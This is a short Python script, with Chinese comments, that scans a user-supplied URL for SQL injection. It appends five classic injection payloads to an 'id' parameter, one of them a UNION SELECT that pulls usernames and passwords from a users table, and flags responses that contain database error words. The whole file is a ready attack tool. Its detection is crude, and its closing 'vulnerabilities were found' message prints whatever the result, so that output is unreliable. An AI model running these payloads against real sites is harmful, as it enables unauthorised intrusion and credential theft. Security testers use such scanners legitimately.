import requests

# 常见的SQL注入负载
payloads = [
    "' OR '1'='1'; --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1--",
    "' UNION SELECT null, username, password FROM users --",
]

def scan_sql_injection(url):
    for payload in payloads:
        # 构建包含payload的URL
        test_url = f"{url}?id={payload}"
        
        try:
            response = requests.get(test_url)
            
            # 检查响应内容
            # 可以根据应用程序的特定行为来判断是否存在SQL注入
            if "error" in response.text or "mysql" in response.text or "SQL" in response.text:
                print(f"Potential SQL Injection Vulnerabilities: {test_url}")
            else:
                print(f"No vulnerabilities detected: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")

if __name__ == "__main__":
    target_url = input("Please enter the URL you want to scan: ")
    scan_sql_injection(target_url)
    print(f"Scanned! The above possible vulnerabilities were found")
